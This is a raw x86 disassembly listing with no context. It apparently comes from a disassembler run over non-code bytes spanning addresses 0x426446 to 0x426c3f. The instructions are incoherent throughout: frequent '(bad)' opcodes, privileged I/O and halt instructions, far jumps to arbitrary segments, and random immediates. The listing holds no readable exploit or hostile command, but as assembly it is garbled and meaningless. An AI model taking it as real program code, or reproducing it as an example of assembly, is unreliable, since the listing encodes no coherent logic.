  426446:	add    BYTE PTR [ebp-0xec6da6c],ah
  42644c:	ret    0x6166
  42644f:	in     al,dx
  426450:	lods   eax,DWORD PTR ds:[esi]
  426451:	and    DWORD PTR [eax+0x5354b646],edi
  426457:	and    eax,0xdd436cef
  42645c:	stc    
  42645d:	push   ebx
  42645e:	rcl    BYTE PTR [ebp+0x1f],0x5c
  426462:	test   al,0x76
  426464:	loope  0x426408
  426466:	sbb    ebp,ecx
  426468:	lds    ebx,FWORD PTR [edi]
  42646a:	inc    eax
  42646b:	mov    esi,0x2a2f7be6
  426470:	xchg   BYTE PTR [ecx+0xd],bl
  426473:	sub    al,BYTE PTR [ecx+0x10cc38e1]
  426479:	sbb    DWORD PTR [ecx+0x51c37296],0xf4eb41bb
  426483:	arpl   bx,dx
  426485:	frstor [ebp-0x61ef523e]
  42648b:	dec    edi
  42648c:	mov    eax,ds:0x438dcf9a
  426491:	cmc    
  426492:	sub    eax,ebp
  426494:	push   esp
  426495:	pushf  
  426496:	enter  0x7bf2,0x62
  42649a:	mov    dl,BYTE PTR [ebp-0x31cf6dae]
  4264a0:	jle    0x426498
  4264a2:	hlt    
  4264a3:	rcl    BYTE PTR [esi-0x7576cfdd],0x16
  4264aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264ab:	scas   eax,DWORD PTR es:[edi]
  4264ac:	dec    edi
  4264ad:	fnstsw WORD PTR [ebx]
  4264af:	sub    al,0xb5
  4264b1:	pusha  
  4264b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264b3:	adc    BYTE PTR [eax],0x6c
  4264b6:	test   eax,0xe43d6d92
  4264bb:	mov    ecx,ebx
  4264bd:	std    
  4264be:	and    esi,edx
  4264c0:	xor    al,0x4b
  4264c2:	and    BYTE PTR [edx],dl
  4264c4:	shl    DWORD PTR [si],1
  4264c7:	xor    edi,DWORD PTR [edx]
  4264c9:	push   ebx
  4264ca:	xor    ecx,esp
  4264cc:	xchg   esp,eax
  4264cd:	cmc    
  4264ce:	or     eax,0x6c5645f5
  4264d3:	pop    eax
  4264d4:	dec    esi
  4264d5:	add    BYTE PTR [edx+0xe4d5463],dh
  4264db:	lods   eax,DWORD PTR ds:[esi]
  4264dc:	jae    0x4264d7
  4264de:	jp     0x4264aa
  4264e0:	sub    al,0x59
  4264e2:	inc    esi
  4264e3:	xchg   edi,eax
  4264e4:	imul   esi,ecx,0x1b
  4264e7:	iret   
  4264e8:	jmp    0x4264f9
  4264ea:	xchg   dh,dh
  4264ec:	sub    eax,0xf9eafeb4
  4264f1:	lea    ebp,[ebx-0x4b]
  4264f4:	adc    DWORD PTR [edx+0x6c],eax
  4264f7:	iret   
  4264f8:	xchg   edx,eax
  4264f9:	stc    
  4264fa:	outs   dx,DWORD PTR ds:[esi]
  4264fb:	fisub  WORD PTR [esi-0x2cd400da]
  426501:	dec    edi
  426502:	jecxz  0x4264a2
  426504:	pop    ecx
  426505:	jmp    0x2c3a:0x3c0242aa
  42650c:	add    DWORD PTR ss:[ecx+eiz*2+0x7b],edx
  426511:	pop    ecx
  426512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426513:	adc    dh,BYTE PTR [edx]
  426515:	xor    BYTE PTR [edx+0x7d],cl
  426518:	call   0x7d93c003
  42651d:	jbe    0x426508
  42651f:	popf   
  426520:	loope  0x426573
  426522:	outs   dx,DWORD PTR ds:[esi]
  426523:	inc    eax
  426524:	sti    
  426525:	in     eax,dx
  426526:	out    0xcb,eax
  426528:	pop    ecx
  426529:	push   ss
  42652a:	adc    BYTE PTR [ecx-0x7f],ah
  42652d:	addr16 jmp 0x33500f95
  426533:	loopne 0x4264f5
  426535:	sub    bl,BYTE PTR ds:0x1e528b7b
  42653b:	arpl   WORD PTR [eax+0x370d38ed],cx
  426541:	pop    ds
  426542:	or     ebx,DWORD PTR [esi+0x675f78ae]
  426548:	test   BYTE PTR [edi-0xf11566a],bl
  42654e:	jecxz  0x42658c
  426550:	cwde   
  426551:	ja     0x4264d9
  426553:	mov    ch,0x8d
  426555:	(bad)  
  426556:	pop    edi
  426557:	cmp    al,0x4c
  426559:	sbb    esp,DWORD PTR [eax+esi*4]
  42655c:	loopne 0x426554
  42655e:	pop    ecx
  42655f:	xchg   edx,eax
  426560:	out    dx,eax
  426561:	mov    DWORD PTR [ebp-0x7fa5f023],ecx
  426567:	xor    al,0x4
  426569:	pushf  
  42656a:	mov    ebx,edx
  42656c:	mov    edi,0xa6342b01
  426571:	popa   
  426572:	sbb    ecx,ebp
  426574:	mov    DWORD PTR [ebx+edi*8+0x2a],edx
  426578:	lea    esp,[edx+ebp*1]
  42657b:	sbb    edx,edi
  42657d:	cmp    al,0xd1
  42657f:	(bad)  
  426580:	xor    bh,BYTE PTR [eax-0x74]
  426583:	push   ds
  426584:	clc    
  426585:	or     BYTE PTR [eax+0x2d0bdfe4],bl
  42658b:	mov    ebp,0x7f6a7f2
  426590:	bound  esp,QWORD PTR [ecx-0x3f967bb2]
  426596:	push   ss
  426597:	imul   ebx,DWORD PTR [ebx+0x6e],0xb3befe25
  42659e:	retf   0xe2d7
  4265a1:	mov    ah,0x4a
  4265a3:	test   eax,0xcd03baba
  4265a8:	jne    0x4265df
  4265aa:	add    eax,0xd3fa0c34
  4265af:	loopne 0x4265bf
  4265b1:	xor    BYTE PTR [ecx+edi*8-0x5c],0xe3
  4265b6:	fiadd  DWORD PTR ds:0x13ef4b0a
  4265bc:	or     al,0x4a
  4265be:	mov    edx,0x865b3922
  4265c3:	xor    DWORD PTR [ebx],0x188d89f0
  4265c9:	cwde   
  4265ca:	cmp    esi,edi
  4265cc:	rcl    BYTE PTR [esi+0x71],cl
  4265cf:	and    dh,BYTE PTR [ebx+0x2d6aee39]
  4265d5:	bound  eax,QWORD PTR [ebx+ebx*1-0x4aeb5785]
  4265dc:	mov    ch,0x3f
  4265de:	push   ss
  4265df:	push   ebx
  4265e0:	pop    es
  4265e1:	add    ah,BYTE PTR [edi]
  4265e3:	test   eax,0x85efbc8d
  4265e8:	or     DWORD PTR [edx-0xf0dd2e],ebp
  4265ee:	addr16 pop edx
  4265f0:	adc    DWORD PTR [edi],esp
  4265f2:	pop    ds
  4265f3:	(bad)  
  4265f4:	outs   dx,BYTE PTR ds:[esi]
  4265f5:	xchg   BYTE PTR [edx],cl
  4265f7:	xchg   esi,eax
  4265f8:	out    0x35,eax
  4265fa:	xor    al,0x64
  4265fc:	js     0x426613
  4265fe:	fwait
  4265ff:	in     al,dx
  426600:	push   es
  426601:	fmul   DWORD PTR [edx-0x648bbfa8]
  426607:	add    DWORD PTR [ecx+0xd],ebx
  42660a:	adc    DWORD PTR [edx+0x55],edx
  42660d:	and    eax,0x5aaabbde
  426612:	(bad)
  426616:	fcom   QWORD PTR [ecx]
  426618:	push   ds
  426619:	mov    ecx,0xd27fe8c8
  42661e:	sbb    dl,BYTE PTR [ebp+0x72]
  426621:	or     ebx,edx
  426623:	or     bh,BYTE PTR [ecx-0x40]
  426626:	cmp    eax,0x11f91aa1
  42662b:	sbb    BYTE PTR [ebp+0x1d8e007b],dl
  426631:	imul   ebx,ebx,0xfffffffb
  426634:	(bad)  
  426635:	mov    esi,0xa4979b5d
  42663a:	adc    ecx,DWORD PTR [edx]
  42663c:	(bad)  
  42663d:	cmc    
  42663e:	loopne 0x426667
  426640:	fiadd  WORD PTR [ecx]
  426642:	add    bh,ah
  426644:	add    DWORD PTR [eax],eax
  426646:	add    BYTE PTR [edx+0x47],ch
  426649:	mov    cl,dl
  42664b:	sbb    DWORD PTR [ebp-0x4cd13580],0x1e7bdab9
  426655:	sbb    BYTE PTR [edi],ch
  426657:	xchg   edi,ebp
  426659:	or     eax,0xa214b9bf
  42665e:	mov    bh,BYTE PTR [esi]
  426660:	jno    0x42663b
  426662:	mov    ebp,0x298e8389
  426667:	cmp    eax,0xc401bb2
  42666c:	imul   ebx,DWORD PTR [eax],0xe3db4eda
  426672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426673:	or     DWORD PTR [edx+esi*1+0x61cf38a0],0xb3ebd6e0
  42667e:	jecxz  0x42663a
  426680:	push   ebp
  426681:	push   esi
  426682:	lahf   
  426683:	ss in  eax,dx
  426685:	jle    0x42667d
  426687:	lock bound edi,QWORD PTR [ebp+0x65]
  42668b:	mov    al,ds:0x6b9af818
  426690:	pop    ds
  426691:	or     BYTE PTR [esp+ecx*1],bh
  426694:	pop    ds
  426695:	pop    ebp
  426696:	xlat   BYTE PTR ds:[ebx]
  426697:	adc    al,0x47
  426699:	push   eax
  42669a:	pop    edx
  42669b:	mov    ds:0x1752ea0e,eax
  4266a0:	imul   ecx,DWORD PTR [edi],0xf2c8e488
  4266a6:	ret    0xaa33
  4266a9:	ja     0x4266c5
  4266ab:	pusha  
  4266ac:	push   es
  4266ad:	fcomp  DWORD PTR [esi]
  4266af:	push   ecx
  4266b0:	push   esp
  4266b1:	fild   DWORD PTR [eax+0x3f]
  4266b4:	push   es
  4266b5:	rol    dh,1
  4266b7:	int3   
  4266b8:	retf   
  4266b9:	mov    ds:0x351d58b8,al
  4266be:	xor    bl,BYTE PTR es:[eax+0x3d33eb6]
  4266c5:	lods   eax,DWORD PTR ds:[esi]
  4266c6:	in     eax,0x83
  4266c8:	cwde   
  4266c9:	ins    DWORD PTR es:[edi],dx
  4266ca:	adc    BYTE PTR [edi+0x3],0xbd
  4266ce:	jecxz  0x42668d
  4266d0:	(bad)
  4266d3:	dec    edi
  4266d4:	push   esp
  4266d5:	xor    bh,BYTE PTR [ecx]
  4266d7:	retf   0xf005
  4266da:	mov    edi,0x5e69d0cc
  4266df:	out    dx,al
  4266e0:	(bad)  
  4266e1:	dec    edi
  4266e2:	jl     0x4266fd
  4266e4:	add    BYTE PTR [ecx-0x33b1bbeb],dl
  4266ea:	and    BYTE PTR [esi+0x20],dh
  4266ed:	mov    ecx,0x3ec9eee4
  4266f2:	popa   
  4266f3:	xchg   ebp,eax
  4266f4:	ins    DWORD PTR es:[edi],dx
  4266f5:	(bad)  
  4266f6:	out    dx,eax
  4266f7:	pusha  
  4266f8:	cmp    dh,BYTE PTR [ebx]
  4266fa:	adc    DWORD PTR [esi-0x33940746],0xd67e2462
  426704:	call   0xfcda1b6f
  426709:	push   ebp
  42670a:	push   ds
  42670b:	ja     0x426770
  42670d:	aam    0x65
  42670f:	in     eax,dx
  426710:	or     dl,0x2c
  426713:	or     ch,dh
  426715:	dec    DWORD PTR [esi]
  426717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426718:	(bad)  
  42671a:	dec    edi
  42671b:	repz or al,0x59
  42671e:	push   es
  42671f:	push   0x9b2c99fe
  426724:	lahf   
  426725:	aaa    
  426726:	cmp    ecx,eax
  426728:	jge    0x426784
  42672a:	dec    ebp
  42672b:	or     al,0xc1
  42672d:	push   0xba1e277b
  426732:	ret    0xded5
  426735:	mov    cs,WORD PTR [edi-0x20]
  426738:	and    al,0x12
  42673a:	mov    ah,0x10
  42673c:	xchg   edi,eax
  42673d:	fs push eax
  42673f:	or     al,0xa1
  426741:	sbb    al,0x4a
  426743:	mov    eax,ds:0x961034e7
  426748:	(bad)  
  42674a:	sbb    al,BYTE PTR [esp+edx*4+0x54]
  42674e:	out    0x98,eax
  426750:	and    dh,BYTE PTR [esi-0x5f]
  426753:	(bad)  
  426754:	sbb    eax,0x216b5487
  426759:	push   0xf
  42675b:	repnz int3 
  42675d:	and    edx,DWORD PTR [edi+0x6704e480]
  426763:	stos   DWORD PTR es:[edi],eax
  426764:	mov    eax,ds:0x98624704
  426769:	icebp  
  42676a:	pushf  
  42676b:	sbb    BYTE PTR [eax+0x7801ea1e],cl
  426771:	aaa    
  426772:	jo     0x42671c
  426774:	sbb    BYTE PTR [ecx+0x67cc41c5],0xfa
  42677b:	call   0xdfaa:0x5d1632f
  426782:	loope  0x42672d
  426784:	loop   0x426732
  426786:	stos   BYTE PTR es:[edi],al
  426787:	add    DWORD PTR [eax],ebp
  426789:	(bad)  
  42678a:	ror    dl,1
  42678c:	jno    0x426723
  42678e:	dec    esp
  42678f:	xor    DWORD PTR [edx],edi
  426791:	shr    DWORD PTR [ebp-0x2c],0x6b
  426795:	and    BYTE PTR [ecx],bh
  426797:	lods   eax,DWORD PTR ds:[esi]
  426798:	xor    cl,bl
  42679a:	xchg   esp,eax
  42679b:	adc    al,0x98
  42679d:	inc    esi
  42679e:	lea    ebp,[esi]
  4267a0:	jnp    0x426797
  4267a2:	adc    eax,0x946c9ffe
  4267a7:	scas   al,BYTE PTR es:[edi]
  4267a8:	or     DWORD PTR [ebx],edi
  4267aa:	outs   dx,DWORD PTR ds:[esi]
  4267ab:	mov    ebx,0x83ef3e9a
  4267b0:	mov    eax,0x59704f98
  4267b5:	push   ebp
  4267b6:	out    0x7d,al
  4267b8:	adc    al,0x24
  4267ba:	cmp    eax,0xdb4e2913
  4267bf:	fld1   
  4267c1:	rol    BYTE PTR ds:0xc778c035,cl
  4267c7:	cs mov esi,0xbc19073c
  4267cd:	pop    ebp
  4267ce:	mov    ebp,0x40f457af
  4267d3:	imul   DWORD PTR es:[ecx]
  4267d6:	pop    ds
  4267d7:	add    eax,0x47aad94e
  4267dc:	(bad)  
  4267dd:	mov    esp,?
  4267df:	xor    al,0x58
  4267e1:	dec    eax
  4267e2:	gs mov cl,0xa4
  4267e5:	mov    eax,ds:0x201f4c92
  4267ea:	(bad)  
  4267ec:	repnz xor DWORD PTR ds:[edi],0xfffffff5
  4267f1:	push   ss
  4267f2:	adc    ah,BYTE PTR [edx]
  4267f4:	out    dx,al
  4267f5:	xor    esp,ebp
  4267f7:	pop    ds
  4267f8:	or     ebp,DWORD PTR [eax]
  4267fa:	adc    eax,0x40efee08
  4267ff:	sbb    dl,BYTE PTR [eax+0x682b8861]
  426805:	mov    al,0x7
  426807:	mul    DWORD PTR [edx+0x34]
  42680a:	outs   dx,DWORD PTR ds:[esi]
  42680b:	lods   eax,DWORD PTR ds:[esi]
  42680c:	dec    ebp
  42680d:	sbb    DWORD PTR [edi],0xcc2e195f
  426813:	ins    DWORD PTR es:[edi],dx
  426814:	int3   
  426815:	(bad)  
  426816:	pop    edi
  426817:	mov    ebx,0xe286e84e
  42681c:	mov    edx,fs
  42681e:	add    DWORD PTR ds:0x95d4ed39,0xffffff8d
  426825:	inc    ebx
  426826:	outs   dx,DWORD PTR ds:[esi]
  426827:	rcl    BYTE PTR [edx],cl
  426829:	cli    
  42682a:	dec    edx
  42682b:	dec    ebp
  42682c:	(bad)  
  42682d:	push   0x0
  42682f:	imul   edi,DWORD PTR [esi-0x480049c5],0x2b83ffed
  426839:	scas   al,BYTE PTR es:[edi]
  42683a:	shl    DWORD PTR ds:[edx],1
  42683d:	mov    ah,0x67
  42683f:	push   cs
  426840:	loopne 0x426843
  426842:	add    bh,ah
  426844:	add    DWORD PTR [eax],eax
  426846:	add    BYTE PTR [edx*4-0xd653737],bl
  42684d:	add    eax,0x2ead20d4
  426852:	jb     0x4268ca
  426854:	ds lock mov ah,0x70
  426858:	dec    DWORD PTR [edx-0x3add14d3]
  42685e:	and    al,0x3d
  426860:	ss mov dh,0x37
  426863:	sub    DWORD PTR [esi-0x17],eax
  426866:	pop    edi
  426867:	ds inc esi
  426869:	and    ch,cl
  42686b:	jecxz  0x4268e6
  42686d:	test   eax,0xe9680b50
  426872:	mov    ecx,0x4f75c6e2
  426877:	lahf   
  426878:	in     eax,0x25
  42687a:	xchg   DWORD PTR [edx-0x46],edi
  42687d:	mov    cl,0x3b
  42687f:	out    dx,al
  426880:	adc    eax,0x1ff1948f
  426885:	or     dh,BYTE PTR [ebx]
  426887:	fistp  WORD PTR [ecx+edx*1-0x52]
  42688b:	or     eax,0x7f0315fb
  426890:	mov    eax,ds:0x75b2ca3f
  426895:	cmc    
  426896:	add    eax,0xbf3ae2dc
  42689b:	or     DWORD PTR [ebx],esi
  42689d:	loop   0x4268cf
  42689f:	sub    BYTE PTR [edi],0xa
  4268a2:	mov    dl,BYTE PTR [esi-0x770e1bf3]
  4268a8:	inc    eax
  4268a9:	push   ds
  4268aa:	dec    ebx
  4268ab:	fmul   st,st(1)
  4268ad:	xchg   ebx,eax
  4268ae:	aas    
  4268af:	sar    BYTE PTR [edx+0x45305493],0x81
  4268b6:	inc    edx
  4268b7:	xchg   esp,eax
  4268b8:	leave  
  4268b9:	enter  0xd457,0x61
  4268bd:	pusha  
  4268be:	mov    eax,0xe5ad2d1e
  4268c3:	mov    eax,0xbd9e11c2
  4268c8:	popa   
  4268c9:	mov    ds:0x507453ba,eax
  4268ce:	mov    esi,0x1dd707e4
  4268d3:	xchg   edx,eax
  4268d4:	jmp    0x4268c6
  4268d6:	das    
  4268d7:	cli    
  4268d8:	sub    DWORD PTR [ecx],ecx
  4268da:	xchg   ebp,eax
  4268db:	pop    esi
  4268dc:	test   esp,0x4d3ab0
  4268e2:	loopne 0x426928
  4268e4:	mov    dh,ch
  4268e6:	fcom   DWORD PTR [eax-0x7b]
  4268e9:	inc    edx
  4268ea:	push   esi
  4268eb:	push   eax
  4268ec:	push   edx
  4268ed:	outs   dx,DWORD PTR ds:[esi]
  4268ee:	sbb    al,BYTE PTR [edx]
  4268f0:	int3   
  4268f1:	stos   DWORD PTR es:[edi],eax
  4268f2:	retf   
  4268f3:	adc    eax,0x3fe4a92
  4268f8:	out    dx,eax
  4268f9:	jl     0x42690a
  4268fb:	es push edx
  4268fd:	rcr    BYTE PTR [esi],0xca
  426900:	xchg   ecx,eax
  426901:	xor    DWORD PTR [esi+edx*4],edi
  426904:	arpl   WORD PTR ds:[ebx+0x54],bx
  426908:	or     al,0xc6
  42690a:	sbb    DWORD PTR [esi-0x300aede3],edi
  426910:	pop    edx
  426911:	jle    0x426920
  426913:	dec    edi
  426914:	fsubr  QWORD PTR [ebx-0x52]
  426917:	lock test al,0x50
  42691a:	ret    
  42691b:	aad    0xed
  42691d:	jp     0x4268ba
  42691f:	push   edx
  426920:	aas    
  426921:	jge    0x426947
  426923:	hlt    
  426924:	pop    ds
  426925:	push   ebx
  426926:	mov    eax,0x89d89baa
  42692b:	pushf  
  42692c:	and    bl,dl
  42692e:	lahf   
  42692f:	jmp    DWORD PTR [ecx-0x608410c7]
  426935:	mov    ecx,0x47e6f258
  42693a:	das    
  42693b:	loope  0x42695b
  42693d:	add    al,0xd6
  42693f:	jecxz  0x426951
  426941:	jl     0x4268cd
  426943:	inc    edi
  426944:	mov    al,0x9f
  426946:	pusha  
  426947:	cmp    bl,dh
  426949:	jl     0x4268f4
  42694b:	add    BYTE PTR [ebx+0x8318835],ah
  426951:	inc    ebp
  426952:	imul   ebx,DWORD PTR [esi],0x2f297a52
  426958:	mov    ebp,0x73e27f5c
  42695d:	add    al,0x19
  42695f:	sub    bl,BYTE PTR [edx+0x213a95da]
  426965:	dec    esp
  426966:	sti    
  426967:	fcomp  QWORD PTR [edi-0x1a6601ad]
  42696d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42696e:	enter  0x96fe,0x7e
  426972:	int    0xe4
  426974:	fsubr  QWORD PTR [esi-0x4a]
  426977:	push   ss
  426978:	dec    eax
  426979:	xlat   BYTE PTR ds:[ebx]
  42697a:	pop    esi
  42697b:	xlat   BYTE PTR ds:[ebx]
  42697c:	jmp    0x426982
  42697e:	(bad)  
  42697f:	pop    edx
  426980:	mov    dl,0x8c
  426982:	adc    DWORD PTR [ebx-0x6f],esp
  426985:	mov    WORD PTR [esi+0x7aaa3bb8],?
  42698b:	jp     0x4269c8
  42698d:	push   ebx
  42698e:	(bad)  
  42698f:	(bad)  
  426990:	mov    esp,0x921c1b57
  426995:	cld    
  426996:	gs xor eax,0xa18caa62
  42699c:	(bad)  
  42699d:	push   0xa7702c8
  4269a2:	es pushf 
  4269a4:	add    al,0x4f
  4269a6:	pop    edx
  4269a7:	xchg   ebx,eax
  4269a8:	enter  0xaef5,0x88
  4269ac:	fcomp  QWORD PTR [eax-0x57]
  4269af:	mov    edi,0xdcd549a3
  4269b4:	lock lahf 
  4269b6:	repnz int 0x98
  4269b9:	repnz or al,0x84
  4269bc:	mov    al,ds:0x930b40ff
  4269c1:	retf   
  4269c2:	in     al,dx
  4269c3:	xchg   ebp,eax
  4269c4:	mov    DWORD PTR [ebx+0x21d0514f],edi
  4269ca:	jbe    0x426978
  4269cc:	cmp    al,0x96
  4269ce:	inc    ebp
  4269cf:	pusha  
  4269d0:	sbb    al,0xf6
  4269d2:	adc    al,0x6
  4269d4:	stc    
  4269d5:	ja     0x426a41
  4269d7:	cmp    ch,BYTE PTR [esi+0x7d]
  4269da:	lock or DWORD PTR ds:0xee48a102,ecx
  4269e1:	addr16 (bad) 
  4269e3:	mov    edx,0xda750521
  4269e8:	retf   
  4269e9:	or     BYTE PTR [ecx-0x21],0x98
  4269ed:	mov    ebx,0xb3f694f5
  4269f2:	push   eax
  4269f3:	fcomp  st(6)
  4269f5:	in     al,dx
  4269f6:	hlt    
  4269f7:	daa    
  4269f8:	push   ds
  4269f9:	not    esi
  4269fb:	rol    BYTE PTR [edi-0x20d5e26f],1
  426a01:	ror    BYTE PTR [ebx+ebx*8],0x90
  426a05:	xchg   esp,eax
  426a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a07:	out    0x8,eax
  426a09:	(bad)  [edx+0x7e4ad2df]
  426a0f:	jmp    0x426a83
  426a11:	test   DWORD PTR ds:0x85e209d7,esp
  426a17:	or     BYTE PTR [edi-0x67],bh
  426a1a:	shl    DWORD PTR [ebp+0x7ed908c6],cl
  426a20:	and    ebp,DWORD PTR [ebx-0x32]
  426a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a24:	and    bl,cl
  426a26:	sub    al,0xf8
  426a28:	ss push es
  426a2a:	lahf   
  426a2b:	scas   al,BYTE PTR es:[edi]
  426a2c:	cld    
  426a2d:	or     eax,0xc48eb00
  426a32:	(bad)  
  426a33:	scas   eax,DWORD PTR es:[edi]
  426a34:	(bad)  
  426a35:	jmp    0x426aa3
  426a37:	arpl   WORD PTR [ebx+edx*4-0x27c627b8],bx
  426a3e:	pop    ebx
  426a3f:	cmc    
  426a40:	loope  0x426a43
  426a42:	add    bh,ah
  426a44:	add    DWORD PTR [eax],eax
  426a46:	add    bh,al
  426a48:	test   esp,ecx
  426a4a:	cmp    BYTE PTR [ebx],bh
  426a4c:	pop    eax
  426a4d:	and    BYTE PTR [eax+0x7def5d2a],0xff
  426a54:	sub    DWORD PTR [esi+0x49689024],esp
  426a5a:	ds dec esp
  426a5c:	push   0x1ed78e3e
  426a61:	pop    eax
  426a62:	test   eax,0x5a7965b6
  426a67:	cmc    
  426a68:	lods   al,BYTE PTR ds:[esi]
  426a69:	rol    BYTE PTR [edx-0x31],0x35
  426a6d:	call   0x55134059
  426a72:	dec    ebp
  426a73:	lods   eax,DWORD PTR ds:[esi]
  426a74:	test   DWORD PTR [esi],eax
  426a76:	mov    WORD PTR [edi],ds
  426a78:	aas    
  426a79:	push   sp
  426a7b:	xchg   cx,ax
  426a7d:	sbb    bh,BYTE PTR [ecx-0x49fe6777]
  426a83:	in     eax,0x7c
  426a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a86:	add    DWORD PTR [esi+edi*4+0x22],esi
  426a8a:	mov    dl,0x59
  426a8c:	add    bl,BYTE PTR [ecx-0x52c6ddd6]
  426a92:	sub    eax,eax
  426a94:	call   0x890ebf7e
  426a99:	dec    ebx
  426a9a:	or     al,0x4c
  426a9c:	es pop ecx
  426a9e:	inc    ebp
  426a9f:	into   
  426aa0:	je     0x426aef
  426aa2:	leave  
  426aa3:	xchg   BYTE PTR [eax+0x7f],ah
  426aa6:	push   esi
  426aa7:	leave  
  426aa8:	sub    bl,BYTE PTR [edi]
  426aaa:	add    DWORD PTR [edx-0x1af155e8],ecx
  426ab0:	pop    ds
  426ab1:	(bad)  
  426ab2:	cmp    eax,ebx
  426ab4:	test   eax,0xe6d24f58
  426ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426aba:	mov    ch,0x6c
  426abc:	jae    0x426af1
  426abe:	cmp    al,0xf5
  426ac0:	jecxz  0x426b05
  426ac2:	dec    ecx
  426ac3:	ret    
  426ac4:	fstp   TBYTE PTR [esi+0x2693d801]
  426aca:	test   DWORD PTR [edx],0xfda9f3e0
  426ad0:	nop
  426ad1:	shl    DWORD PTR [edi-0x4f98def6],1
  426ad7:	sahf   
  426ad8:	push   ebx
  426ad9:	mov    bl,0x60
  426adb:	jmp    0x9b5f:0x9724804d
  426ae2:	cli    
  426ae3:	(bad)  
  426ae5:	stos   DWORD PTR es:[edi],eax
  426ae6:	push   0xfffffff9
  426ae8:	sbb    BYTE PTR [eax+0x22b9f69e],0xc5
  426aef:	mov    eax,0x9564eadc
  426af4:	(bad)  
  426af5:	div    BYTE PTR [eax+ecx*2+0x47e515e8]
  426afc:	ret    
  426afd:	dec    eax
  426afe:	add    DWORD PTR [esi-0x17],ecx
  426b01:	sbb    bh,ch
  426b03:	mov    bh,BYTE PTR [esi-0x39]
  426b06:	push   eax
  426b07:	sahf   
  426b08:	and    al,0x78
  426b0a:	mov    eax,ds:0x2d0c6317
  426b0f:	xchg   edi,eax
  426b10:	fidiv  DWORD PTR [eax+esi*1-0x78]
  426b14:	retf   0x8897
  426b17:	jmp    0xa0b8:0x2f2b0222
  426b1e:	adc    cl,cl
  426b20:	cmp    edx,edx
  426b22:	aaa    
  426b23:	or     edx,DWORD PTR [esi+ecx*4]
  426b26:	or     DWORD PTR [ecx],edx
  426b28:	add    eax,0x88ab81f
  426b2d:	pop    eax
  426b2e:	mov    BYTE PTR [eax],cl
  426b30:	mov    esi,0x7a6204ae
  426b35:	in     al,dx
  426b36:	jp     0x426bb4
  426b38:	sub    eax,0xa48d8fe
  426b3d:	les    ebx,FWORD PTR [esi+0x60]
  426b40:	ja     0x426b46
  426b42:	and    bl,BYTE PTR [ebp+0x2]
  426b45:	or     bh,BYTE PTR [ebx-0x69]
  426b48:	pop    ebx
  426b49:	xor    BYTE PTR [ecx],cl
  426b4b:	push   esp
  426b4c:	in     eax,dx
  426b4d:	inc    esp
  426b4e:	jb     0x426b19
  426b50:	int3   
  426b51:	mov    edi,DWORD PTR [ebx+0x33]
  426b54:	mov    ecx,0x41dbf29
  426b59:	push   esi
  426b5a:	dec    esi
  426b5b:	jns    0x426b62
  426b5d:	retf   0x9e03
  426b60:	mov    ch,BYTE PTR [esp+ebx*8]
  426b63:	and    eax,0x21b66909
  426b68:	or     eax,0x762a2509
  426b6d:	int3   
  426b6e:	lds    esp,FWORD PTR [edi]
  426b70:	dec    esi
  426b71:	hlt    
  426b72:	jmp    0x4496:0xa67c42d2
  426b79:	retf   
  426b7a:	jnp    0x426bd9
  426b7c:	mov    ah,0x4a
  426b7e:	sbb    DWORD PTR [esp+ebp*4-0x27b756eb],ecx
  426b85:	sub    dh,dh
  426b87:	sbb    DWORD PTR [ebp-0x6e863198],esp
  426b8d:	retf   
  426b8e:	(bad)  
  426b8f:	shl    DWORD PTR [edi+ebx*4-0x2105df56],cl
  426b96:	adc    al,0xca
  426b98:	daa    
  426b99:	mov    ecx,0xee622195
  426b9e:	and    BYTE PTR [edx],0xd3
  426ba1:	push   0x20
  426ba3:	andnps xmm0,XMMWORD PTR [ecx]
  426ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ba7:	div    BYTE PTR [eax]
  426ba9:	and    al,0x7f
  426bab:	daa    
  426bac:	or     al,0xee
  426bae:	jg     0x426bfb
  426bb0:	mov    esi,0x1f9f3c74
  426bb5:	and    al,0x2f
  426bb7:	jp     0x426b83
  426bb9:	ret    0x2cc9
  426bbc:	mov    dl,0x7c
  426bbe:	mov    WORD PTR [eax+ebp*4+0x28e3bd24],ds
  426bc5:	ins    DWORD PTR es:[edi],dx
  426bc6:	ja     0x426b78
  426bc8:	jge    0x426c05
  426bca:	idiv   BYTE PTR [edi+edi*1+0x5c06fb86]
  426bd1:	adc    BYTE PTR [eax-0x7],0x78
  426bd5:	call   0x9a463a0d
  426bda:	mov    dl,0x8c
  426bdc:	xchg   edx,eax
  426bdd:	scas   al,BYTE PTR es:[edi]
  426bde:	add    bh,bh
  426be0:	stc    
  426be1:	push   eax
  426be2:	in     eax,dx
  426be3:	int    0x74
  426be5:	add    al,0x1e
  426be7:	stos   DWORD PTR es:[edi],eax
  426be8:	cs xchg esi,eax
  426bea:	push   edi
  426beb:	xor    ebp,esi
  426bed:	gs repnz xchg ecx,eax
  426bf0:	popa   
  426bf1:	out    0xb,al
  426bf3:	mov    ch,0x62
  426bf5:	cmp    BYTE PTR [eax-0x6f],al
  426bf8:	stc    
  426bf9:	out    0x9f,al
  426bfb:	mov    dh,bl
  426bfd:	xor    eax,0x8fc8aeae
  426c02:	imul   edx,DWORD PTR [ebx-0x2],0xf8e8e0a
  426c09:	stc    
  426c0a:	fs addr16 jnp 0x426c00
  426c0e:	push   ebp
  426c0f:	imul   eax,DWORD PTR [esi],0x8a207fe5
  426c15:	sbb    DWORD PTR [ebx-0x39],esi
  426c18:	xchg   DWORD PTR [edx],ebp
  426c1a:	jnp    0x426c76
  426c1c:	pop    ecx
  426c1d:	cli    
  426c1e:	sub    BYTE PTR [edi-0x2f6d465a],ah
  426c24:	loope  0x426c08
  426c26:	pop    edi
  426c27:	shl    BYTE PTR [edx],cl
  426c29:	sbb    DWORD PTR [eax+edi*8-0x13ffaafe],edi
  426c30:	test   BYTE PTR [eax-0x5f],ah
  426c33:	push   0xd0cdede5
  426c38:	imul   ebp,DWORD PTR [ebx],0xe3a3103
  426c3e:	out    dx,al
  426c3f:	fsubr  st(3),st
